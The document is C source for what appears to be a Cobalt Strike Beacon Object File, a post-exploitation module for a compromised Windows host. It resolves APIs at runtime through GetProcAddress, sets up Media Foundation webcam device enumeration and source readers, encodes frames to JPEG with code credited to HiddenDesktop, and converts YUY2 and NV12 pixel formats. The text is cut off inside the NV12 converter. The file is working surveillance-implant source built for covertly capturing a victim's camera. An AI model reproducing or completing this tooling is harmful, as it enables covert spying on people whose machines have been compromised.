#ifdef DECLSPEC_SELECTANY
#undef DECLSPEC_SELECTANY
#endif
#define DECLSPEC_SELECTANY
#define INITGUID
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strsafe.h>
#include <d3d9.h>
#include <mferror.h>
#include "mfapi.h"
#include <mfidl.h>
#include <mfreadwrite.h>
#include <stdbool.h>
#include <gdiplus.h>
#include <objidl.h> 

/* Avoid redefinitions from bofdefs.h */
#undef ZeroMemory
#define ZeroMemory(address, size) memset(address, 0, size)
#undef malloc

// #pragma comment(lib, "mf.lib")
// #pragma comment(lib, "mfplat.lib")
// #pragma comment(lib, "mfplay.lib")
// #pragma comment(lib, "mfreadwrite.lib")
// #pragma comment(lib, "mfuuid.lib")
// #pragma comment(lib, "wmcodecdspuuid.lib")

#ifdef BOF
#include "bofdefs.h"
#endif

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
    //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line, msg, hr);
#else
    printf("[-] (%s at %d): %s 0x%08lx\n", func, line, msg, hr);
#endif
    return FALSE;
}
#pragma endregion

#define SAFE_RELEASE(p) do { if(p) { (p)->lpVtbl->Release(p); (p)=NULL; } } while(0)



/* Define our own constant GUIDs for video formats */
static const GUID s_MFVideoFormat_RGB32 = { 0x00000016, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MFVideoFormat_RGB24 = { 0x00000017, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MFVideoFormat_YUY2  = { 0x32595559, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MFVideoFormat_NV12  = { 0x3231564E, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MF_READWRITE_DISABLE_CONVERTERS = { 0x98d5b065, 0x1374, 0x4847, {0x8d,0x5d,0x31,0x52,0x0f,0xee,0x71,0x56} };
static const GUID s_MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS = { 0xa634a91c, 0x822b, 0x41b9, {0xa4,0x94,0x4d,0xe4,0x64,0x36,0x12,0xb0} };
static const GUID s_MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING = { 0xfb394f3d, 0xccf1, 0x42ee, {0xbb,0xb3,0xf9,0xb8,0x45,0xd5,0x68,0x1d} };

/* API function pointers */
typedef HANDLE (WINAPI* PFN_CreateFile)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
PFN_CreateFile pCreateFile = NULL;
typedef BOOL (WINAPI* PFN_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
PFN_WriteFile pWriteFile = NULL;
typedef BOOL (WINAPI* PFN_CloseHandle)(HANDLE);
PFN_CloseHandle pCloseHandle = NULL;
typedef HANDLE (WINAPI* PFN_FindFirstFile)(LPCSTR, LPWIN32_FIND_DATA);
PFN_FindFirstFile pFindFirstFile = NULL;
typedef BOOL (WINAPI* PFN_FindClose)(HANDLE);
PFN_FindClose pFindClose = NULL;
typedef VOID (WINAPI* PFN_DebugBreak)(void);
PFN_DebugBreak pDebugBreak = NULL;
typedef VOID (WINAPI* PFN_ZeroMemory)(PVOID, SIZE_T);
PFN_ZeroMemory pZeroMemory = NULL;
typedef VOID (WINAPI* PFN_CoTaskMemFree)(LPVOID);
PFN_CoTaskMemFree pCoTaskMemFree = NULL;
typedef HRESULT (WINAPI* PFN_CoInitializeEx)(LPVOID, DWORD);
PFN_CoInitializeEx pCoInitializeEx = NULL;

typedef HRESULT (WINAPI* PFN_MFGetStrideForBitmapInfoHeader)(REFGUID, UINT32, LONG*);
PFN_MFGetStrideForBitmapInfoHeader pMFGetStrideForBitmapInfoHeader = NULL;
typedef HRESULT (WINAPI* PFN_MFCreateAttributes)(IMFAttributes**, UINT32);
PFN_MFCreateAttributes pMFCreateAttributes = NULL;
typedef HRESULT (WINAPI* PFN_MFEnumDeviceSources)(IMFAttributes*, IMFActivate***, UINT32*);
PFN_MFEnumDeviceSources pMFEnumDeviceSources = NULL;
typedef HRESULT (WINAPI* PFN_MFCreateSourceReaderFromMediaSource)(IMFMediaSource*, IMFAttributes*, IMFSourceReader**);
PFN_MFCreateSourceReaderFromMediaSource pMFCreateSourceReaderFromMediaSource = NULL;
typedef HRESULT (WINAPI* PFN_MFCreateDeviceSource)(IMFAttributes*, IMFMediaSource**);
PFN_MFCreateDeviceSource pMFCreateDeviceSource = NULL;
typedef HRESULT (WINAPI* PFN_MFCreateMediaType)(IMFMediaType**);
PFN_MFCreateMediaType pMFCreateMediaType = NULL;
typedef void (WINAPI* PFN_MFCopyImage)(BYTE*, LONG, const BYTE*, LONG, DWORD, DWORD);
PFN_MFCopyImage pMFCopyImage = NULL;
typedef DWORD (WINAPI* PFN_GetCurrentProcessId)(void);
static PFN_GetCurrentProcessId    pGetCurrentProcessId = NULL;
typedef BOOL (WINAPI* PFN_ProcessIdToSessionId)(DWORD dwProcessId, DWORD* pSessionId);
static PFN_ProcessIdToSessionId   pProcessIdToSessionId = NULL;
typedef char* (__cdecl *PFN_getenv)(const char*);
static PFN_getenv pgetenv = NULL;
BOOL ResolveAPIs() {
    HMODULE hMSVCRT = GetModuleHandleA("msvcrt.dll");
    pgetenv = (PFN_getenv)GetProcAddress(hMSVCRT, "getenv");
    // Load Kernel32
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load kernel32.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded kernel32.dll at 0x%p", hKernel32);

    // Resolve Kernel32 APIs
    pGetCurrentProcessId = (PFN_GetCurrentProcessId)GetProcAddress(hKernel32, "GetCurrentProcessId");
    if (!pGetCurrentProcessId) return FALSE;
    pProcessIdToSessionId = (PFN_ProcessIdToSessionId)GetProcAddress(hKernel32, "ProcessIdToSessionId");
    if (!pProcessIdToSessionId) return FALSE;
    pCreateFile = (PFN_CreateFile)GetProcAddress(hKernel32, "CreateFileA");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CreateFileA at 0x%p", pCreateFile);
    if (!pCreateFile) return FALSE;

    pWriteFile = (PFN_WriteFile)GetProcAddress(hKernel32, "WriteFile");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] WriteFile at 0x%p", pWriteFile);
    if (!pWriteFile) return FALSE;

    pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CloseHandle at 0x%p", pCloseHandle);
    if (!pCloseHandle) return FALSE;

    pFindFirstFile = (PFN_FindFirstFile)GetProcAddress(hKernel32, "FindFirstFileA");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] FindFirstFileA at 0x%p", pFindFirstFile);
    if (!pFindFirstFile) return FALSE;

    pFindClose = (PFN_FindClose)GetProcAddress(hKernel32, "FindClose");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] FindClose at 0x%p", pFindClose);
    if (!pFindClose) return FALSE;

    pDebugBreak = (PFN_DebugBreak)GetProcAddress(hKernel32, "DebugBreak");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] DebugBreak at 0x%p", pDebugBreak);
    if (!pDebugBreak) return FALSE;

    pZeroMemory = (PFN_ZeroMemory)GetProcAddress(hKernel32, "RtlZeroMemory");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] RtlZeroMemory at 0x%p", pZeroMemory);
    if (!pZeroMemory) return FALSE;

    // Load Ole32
    HMODULE hOle32 = GetModuleHandleA("ole32.dll");
    if (!hOle32) hOle32 = LoadLibraryA("ole32.dll");
    if (!hOle32) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load ole32.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded ole32.dll at 0x%p", hOle32);

    pCoTaskMemFree = (PFN_CoTaskMemFree)GetProcAddress(hOle32, "CoTaskMemFree");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CoTaskMemFree at 0x%p", pCoTaskMemFree);
    if (!pCoTaskMemFree) return FALSE;

    pCoInitializeEx = (PFN_CoInitializeEx)GetProcAddress(hOle32, "CoInitializeEx");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CoInitializeEx at 0x%p", pCoInitializeEx);
    if (!pCoInitializeEx) return FALSE;

    // Load MFPlat.dll
    HMODULE hMFPlat = GetModuleHandleA("mfplat.dll");
    if (!hMFPlat) hMFPlat = LoadLibraryA("mfplat.dll");
    if (!hMFPlat) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load mfplat.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded mfplat.dll at 0x%p", hMFPlat);

    // Resolve valid MFPlat exports
    pMFCreateAttributes = (PFN_MFCreateAttributes)GetProcAddress(hMFPlat, "MFCreateAttributes");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFCreateAttributes at 0x%p", pMFCreateAttributes);
    if (!pMFCreateAttributes) return FALSE;
    pMFCreateMediaType = (PFN_MFCreateMediaType)GetProcAddress(hMFPlat, "MFCreateMediaType");
    if (!pMFCreateMediaType) return FALSE;

    // Resolve MFGetStrideForBitmapInfoHeader
    pMFGetStrideForBitmapInfoHeader = (PFN_MFGetStrideForBitmapInfoHeader)GetProcAddress(hMFPlat, "MFGetStrideForBitmapInfoHeader");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFGetStrideForBitmapInfoHeader at 0x%p", pMFGetStrideForBitmapInfoHeader);
    if (!pMFGetStrideForBitmapInfoHeader) return FALSE;

    pMFCopyImage = (PFN_MFCopyImage)GetProcAddress(hMFPlat, "MFCopyImage");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFCopyImage at 0x%p", pMFCopyImage);
    if (!pMFCopyImage) return FALSE;

    // Load MF.dll
    HMODULE hMF = GetModuleHandleA("mf.dll");
    if (!hMF) hMF = LoadLibraryA("mf.dll");
    if (!hMF) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load mf.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded mf.dll at 0x%p", hMF);

    pMFEnumDeviceSources = (PFN_MFEnumDeviceSources)GetProcAddress(hMF, "MFEnumDeviceSources");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFEnumDeviceSources at 0x%p", pMFEnumDeviceSources);
    if (!pMFEnumDeviceSources) return FALSE;
    pMFCreateDeviceSource = (PFN_MFCreateDeviceSource)GetProcAddress(hMF, "MFCreateDeviceSource");

    // Load MFReadWrite.dll
    HMODULE hMFReadWrite = GetModuleHandleA("mfreadwrite.dll");
    if (!hMFReadWrite) hMFReadWrite = LoadLibraryA("mfreadwrite.dll");
    if (!hMFReadWrite) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load mfreadwrite.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded mfreadwrite.dll at 0x%p", hMFReadWrite);

    pMFCreateSourceReaderFromMediaSource = (PFN_MFCreateSourceReaderFromMediaSource)
        GetProcAddress(hMFReadWrite, "MFCreateSourceReaderFromMediaSource");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFCreateSourceReaderFromMediaSource at 0x%p",pMFCreateSourceReaderFromMediaSource);
    if (!pMFCreateSourceReaderFromMediaSource) return FALSE;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] All required APIs resolved successfully");
    return TRUE;
}

/* Start of stuff ported from HiddenDesktop (i blatantly steal the bmp to jpeg function yet again)*/

// ---------------------------------------------------------------------------
// Typedefs for GDI+ functions
// ---------------------------------------------------------------------------

typedef GpStatus (WINAPI *PFN_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, GdiplusStartupOutput*);
typedef VOID     (WINAPI *PFN_GdiplusShutdown)(ULONG_PTR);
typedef GpStatus (WINAPI *PFN_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
typedef GpStatus (WINAPI *PFN_GdipDisposeImage)(GpImage*);
typedef GpStatus (WINAPI *PFN_GdipSaveImageToStream)(GpImage*, IStream*, const CLSID*, const EncoderParameters*);

// These two functions are also used in your bitmapToJpg function:
typedef GpStatus (WINAPI *PFN_GdipCreateBitmapFromStream)(IStream*, GpBitmap**);
typedef GpStatus (WINAPI *PFN_GdipCreateHBITMAPFromBitmap)(GpBitmap*, HBITMAP*, ARGB);
typedef HBITMAP (WINAPI* PFN_CreateBitmap)(int, int, UINT, UINT, const void*);
typedef HBITMAP (WINAPI* PFN_pCreateDIBSection)(HDC, const BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);

// ---------------------------------------------------------------------------
// Global function pointer variables
// ---------------------------------------------------------------------------

static PFN_CreateBitmap pCreateBitmap = NULL;
static PFN_GdiplusStartup             pGdiplusStartup             = NULL;
static PFN_GdiplusShutdown            pGdiplusShutdown            = NULL;
static PFN_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;
static PFN_GdipDisposeImage           pGdipDisposeImage           = NULL;
static PFN_GdipSaveImageToStream      pGdipSaveImageToStream      = NULL;
static PFN_GdipCreateBitmapFromStream pGdipCreateBitmapFromStream = NULL;
static PFN_GdipCreateHBITMAPFromBitmap pGdipCreateHBITMAPFromBitmap = NULL;
static PFN_pCreateDIBSection pCreateDIBSection = NULL;
// ---------------------------------------------------------------------------
// ResolveGDIs: Loads gdiplus.dll and resolves the required functions
// ---------------------------------------------------------------------------
BOOL ResolveGDIs()
{
    // Attempt to get a handle to gdiplus.dll. If not loaded, load it.
    HMODULE hGdiPlus = GetModuleHandleA("gdiplus.dll");
    if (!hGdiPlus)
        hGdiPlus = LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus)
        return FALSE;

    // Resolve each function and check for failure.
    pGdiplusStartup = (PFN_GdiplusStartup)GetProcAddress(hGdiPlus, "GdiplusStartup");
    if (!pGdiplusStartup)
        return FALSE;

    pGdiplusShutdown = (PFN_GdiplusShutdown)GetProcAddress(hGdiPlus, "GdiplusShutdown");
    if (!pGdiplusShutdown)
        return FALSE;

    pGdipCreateBitmapFromHBITMAP = (PFN_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    if (!pGdipCreateBitmapFromHBITMAP)
        return FALSE;

    pGdipDisposeImage = (PFN_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");
    if (!pGdipDisposeImage)
        return FALSE;

    pGdipSaveImageToStream = (PFN_GdipSaveImageToStream)GetProcAddress(hGdiPlus, "GdipSaveImageToStream");
    if (!pGdipSaveImageToStream)
        return FALSE;

    pGdipCreateBitmapFromStream = (PFN_GdipCreateBitmapFromStream)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromStream");
    if (!pGdipCreateBitmapFromStream)
        return FALSE;

    pGdipCreateHBITMAPFromBitmap = (PFN_GdipCreateHBITMAPFromBitmap)GetProcAddress(hGdiPlus, "GdipCreateHBITMAPFromBitmap");
    if (!pGdipCreateHBITMAPFromBitmap)
        return FALSE;



    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
    if (!hGdi32) hGdi32 = LoadLibraryA("gdi32.dll");
    if (!hGdi32) return FALSE;
    pCreateBitmap = (PFN_CreateBitmap)GetProcAddress(hGdi32, "CreateBitmap");
    if (!pCreateBitmap) {
        BeaconPrintf(CALLBACK_ERROR, "[ERROR] Failed to resolve CreateBitmap");
        return FALSE;
    }
    pCreateDIBSection = (PFN_pCreateDIBSection)GetProcAddress(hGdi32, "CreateDIBSection");
    if (!pCreateDIBSection) {
        BeaconPrintf(CALLBACK_ERROR, "[ERROR] Failed to resolve CreateDIBSection");
        return FALSE;
    }
    return TRUE;
}

/* modified slightly from the one in HiddenDesktop */
BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize)
{
    // Ensure GDI+ APIs are resolved.
    if (!ResolveGDIs() ||
        !pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
        !pGdipDisposeImage || !pGdipSaveImageToStream)
    {
        return FALSE;
    }

    // Initialize GDI+ startup.
    GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;

    ULONG_PTR gdiplusToken = 0;
    if (pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdiplusStartup failed");
        return FALSE;
    }

    // Create a GDI+ bitmap from the HBITMAP.
    GpBitmap* pGpBitmap = NULL;
    if (pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &pGpBitmap) != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCreateBitmapFromHBITMAP failed");
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Create an IStream on a global memory handle.
    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] CreateStreamOnHGlobal failed");
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Set up encoder parameters for JPEG quality.
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    CLSID clsidEncoderQuality = { 0x1d5be4b5, 0xfa4a, 0x452d, {0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb} };
    encoderParams.Parameter[0].Guid = clsidEncoderQuality;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    // JPEG encoder CLSID.
    CLSID clsidJPEG = { 0x557cf401, 0x1a04, 0x11d3, {0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e} };

    // Save the image to the stream as JPEG.
    if (pGdipSaveImageToStream((GpImage*)pGpBitmap, pStream, &clsidJPEG, &encoderParams) != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipSaveImageToStream failed");
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Obtain the size of the stream.
    LARGE_INTEGER liZero;
    liZero.QuadPart = 0;
    ULARGE_INTEGER uliSize;
    uliSize.QuadPart = 0;
    if (pStream->lpVtbl->Seek(pStream, liZero, STREAM_SEEK_END, &uliSize) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Seek to end failed");
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    *pJpegSize = (DWORD)uliSize.QuadPart;
    *pJpegData = (BYTE*)malloc(*pJpegSize);
    if (!*pJpegData) {
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Seek back to the beginning of the stream.
    if (pStream->lpVtbl->Seek(pStream, liZero, STREAM_SEEK_SET, NULL) != S_OK) {
        free(*pJpegData);
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Read the JPEG data into our buffer.
    ULONG bytesRead = 0;
    if (pStream->lpVtbl->Read(pStream, *pJpegData, *pJpegSize, &bytesRead) != S_OK ||
        bytesRead != *pJpegSize)
    {
        free(*pJpegData);
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Cleanup.
    pStream->lpVtbl->Release(pStream);
    pGdipDisposeImage((GpImage*)pGpBitmap);
    pGdiplusShutdown(gdiplusToken);

    return TRUE;
}

/* End of stuff ported from HiddenDesktop */



void CreateBitmapFile(LPCWSTR fileName, long width, long height, WORD bitsPerPixel, BYTE* bitmapData, DWORD bitmapDataLength) {
    HANDLE file;
    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER fileInfo;
    DWORD writePosn = 0;
    file = pCreateFile((LPCSTR)fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    fileHeader.bfType = 19778;
    fileHeader.bfSize = sizeof(fileHeader.bfOffBits) + sizeof(RGBTRIPLE);
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileInfo.biSize = sizeof(BITMAPINFOHEADER);
    fileInfo.biWidth = width;
    fileInfo.biHeight = height;
    fileInfo.biPlanes = 1;
    fileInfo.biBitCount = bitsPerPixel;
    fileInfo.biCompression = BI_RGB;
    fileInfo.biSizeImage = width * height * (bitsPerPixel / 8);
    fileInfo.biXPelsPerMeter = 2400;
    fileInfo.biYPelsPerMeter = 2400;
    fileInfo.biClrImportant = 0;
    fileInfo.biClrUsed = 0;
    pWriteFile(file, &fileHeader, sizeof(fileHeader), &writePosn, NULL);
    pWriteFile(file, &fileInfo, sizeof(fileInfo), &writePosn, NULL);
    pWriteFile(file, bitmapData, bitmapDataLength, &writePosn, NULL);
    pCloseHandle(file);
}

int fileExists(TCHAR* file) {
    WIN32_FIND_DATA FindFileData;
    HANDLE handle = pFindFirstFile((LPCSTR)file, &FindFileData);
    int found = (handle != INVALID_HANDLE_VALUE);
    if (found) {
        pFindClose(handle);
    }
    return found;
}

/* VideoBufferLock */
typedef struct _VideoBufferLock {
    IMFMediaBuffer* pBuffer;
    IMF2DBuffer* p2DBuffer;
    BOOL bLocked;
} VideoBufferLock;

void VideoBufferLock_Init(VideoBufferLock* lock, IMFMediaBuffer* pBuffer) {
    lock->pBuffer = pBuffer;
    pBuffer->lpVtbl->AddRef(pBuffer);
    lock->p2DBuffer = NULL;
    lock->bLocked = FALSE;
    pBuffer->lpVtbl->QueryInterface(pBuffer, &IID_IMF2DBuffer, (void**)&(lock->p2DBuffer));
}

HRESULT VideoBufferLock_LockBuffer(VideoBufferLock* lock, LONG lDefaultStride, DWORD dwHeightInPixels, BYTE** ppbScanLine0, LONG* plStride) {
    HRESULT hr = S_OK;
    if (lock->p2DBuffer) {
        hr = lock->p2DBuffer->lpVtbl->Lock2D(lock->p2DBuffer, ppbScanLine0, plStride);
    } else {
        BYTE* pData = NULL;
        hr = lock->pBuffer->lpVtbl->Lock(lock->pBuffer, &pData, NULL, NULL);
        if (SUCCEEDED(hr)) {
            *plStride = lDefaultStride;
            if (lDefaultStride < 0)
                *ppbScanLine0 = pData + abs(lDefaultStride) * (dwHeightInPixels - 1);
            else
                *ppbScanLine0 = pData;
        }
    }
    lock->bLocked = SUCCEEDED(hr);
    return hr;
}

void VideoBufferLock_UnlockBuffer(VideoBufferLock* lock) {
    if (lock->bLocked) {
        if (lock->p2DBuffer)
            lock->p2DBuffer->lpVtbl->Unlock2D(lock->p2DBuffer);
        else
            lock->pBuffer->lpVtbl->Unlock(lock->pBuffer);
        lock->bLocked = FALSE;
    }
}

void VideoBufferLock_Cleanup(VideoBufferLock* lock) {
    VideoBufferLock_UnlockBuffer(lock);
    SAFE_RELEASE(lock->pBuffer);
    SAFE_RELEASE(lock->p2DBuffer);
}

/* ColorConverter */
typedef void (*IMAGE_TRANSFORM_FN)(BYTE* pDest, LONG lDestStride, const BYTE* pSrc, LONG lSrcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels);

typedef struct _ConversionFunction {
    GUID subtype;
    IMAGE_TRANSFORM_FN xform;
} ConversionFunction;

typedef struct _CColorConverter {
    UINT m_width;
    UINT m_height;
    LONG m_lDefaultStride;
    MFRatio m_PixelAR;
    MFVideoInterlaceMode m_interlace;
    IMAGE_TRANSFORM_FN m_convertFn;
} CColorConverter;

void CColorConverter_Init(CColorConverter* cc) {
    cc->m_convertFn = NULL;
}
void CColorConverter_Destroy(CColorConverter* cc) { }

static void TransformImage_RGB24(BYTE* pDest, LONG lDestStride, const BYTE* pSrc, LONG lSrcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels) {
    DWORD y, x;
    for (y = 0; y < dwHeightInPixels; y++) {
        RGBTRIPLE* pSrcPel = (RGBTRIPLE*)pSrc;
        DWORD* pDestPel = (DWORD*)pDest;
        for (x = 0; x < dwWidthInPixels; x++) {
            pDestPel[x] = D3DCOLOR_XRGB(pSrcPel[x].rgbtRed, pSrcPel[x].rgbtGreen, pSrcPel[x].rgbtBlue);
        }
        pSrc += lSrcStride;
        pDest += lDestStride;
    }
}

static void TransformImage_RGB32(BYTE* pDest, LONG lDestStride, const BYTE* pSrc, LONG lSrcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels) {
    pMFCopyImage(pDest, lDestStride, pSrc, lSrcStride, dwWidthInPixels * 4, dwHeightInPixels);
}

static void TransformImage_YUY2(
    BYTE* pDest, LONG lDestStride,
    const BYTE* pSrc, LONG lSrcStride,
    DWORD dwWidthInPixels, DWORD dwHeightInPixels)
{
    for (DWORD y = 0; y < dwHeightInPixels; y++) {
        RGBQUAD* pDestPel = (RGBQUAD*)pDest;
        WORD*    pSrcPel  = (WORD*)pSrc;

        for (DWORD x = 0; x < dwWidthInPixels; x += 2) {
            int y0 = (int)LOBYTE(pSrcPel[x]);
            int u0 = (int)HIBYTE(pSrcPel[x]);
            int y1 = (int)LOBYTE(pSrcPel[x + 1]);
            int v0 = (int)HIBYTE(pSrcPel[x + 1]);

            // Convert first pixel (Y0, U0, V0)
            int c = y0 - 16;
            int d = u0 - 128;
            int e = v0 - 128;
            
            // Red
            int valR = (298 * c + 409 * e + 128) >> 8;
            if (valR < 0)   valR = 0;
            if (valR > 255) valR = 255;
            BYTE r = (BYTE)valR;

            // Green
            int valG = (298 * c - 100 * d - 208 * e + 128) >> 8;
            if (valG < 0)   valG = 0;
            if (valG > 255) valG = 255;
            BYTE g = (BYTE)valG;

            // Blue
            int valB = (298 * c + 516 * d + 128) >> 8;
            if (valB < 0)   valB = 0;
            if (valB > 255) valB = 255;
            BYTE b = (BYTE)valB;

            pDestPel[x].rgbBlue     = b;
            pDestPel[x].rgbGreen    = g;
            pDestPel[x].rgbRed      = r;
            pDestPel[x].rgbReserved = 0;

            // Convert second pixel (Y1, same U/V)
            c = y1 - 16;
            valR = (298 * c + 409 * e + 128) >> 8;
            if (valR < 0)   valR = 0;
            if (valR > 255) valR = 255;
            r = (BYTE)valR;

            valG = (298 * c - 100 * d - 208 * e + 128) >> 8;
            if (valG < 0)   valG = 0;
            if (valG > 255) valG = 255;
            g = (BYTE)valG;

            valB = (298 * c + 516 * d + 128) >> 8;
            if (valB < 0)   valB = 0;
            if (valB > 255) valB = 255;
            b = (BYTE)valB;

            pDestPel[x + 1].rgbBlue     = b;
            pDestPel[x + 1].rgbGreen    = g;
            pDestPel[x + 1].rgbRed      = r;
            pDestPel[x + 1].rgbReserved = 0;
        }

        pSrc  += lSrcStride;
        pDest += lDestStride;
    }
}


static void TransformImage_NV12(BYTE* pDst, LONG dstStride, const BYTE* pSrc, LONG srcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels) {
    const BYTE* lpBitsY = pSrc;
    const BYTE* lpBitsCb = lpBitsY + (dwHeightInPixels * srcStride);
    const BYTE* lpBitsCr = lpBitsCb + 1;
    UINT y;
    for (y = 0; y < dwHeightInPixels; y += 2) {
        const BYTE* lpLineY1 = lpBitsY;
        const BYTE* lpLineY2 = lpBitsY + srcStride;
        const BYTE* lpLineCr = lpBitsCr;
        const BYTE* lpLineCb = lpBitsCb;
        BYTE* lpDibLine1 = pDst;
        BYTE* lpDibLine2 = pDst + dstStride;
        DWORD x;
        for (x = 0; x < dwWidthInPixels; x += 2) {
            int y0 = (int)lpLineY1[0];
            int y1 = (int)lpLineY1[1];
            int y2 = (int)lpLineY2[0];
            int y3 = (int)lpLineY2[1];
            int cb = (int)lpLineCb[0];
            int cr = (int)lpLineCr[0];
            int c = y0 - 16, d = cb - 128, e = cr - 128;
            BYTE r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            BYTE g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            BYTE b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine1[0] = b; lpDibLine1[1] = g; lpDibLine1[2] = r; lpDibLine1[3] = 0;
            c = y1 - 16;
            r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            b = (BYTE)((298 * c + 516 * d + 128) >> 8);
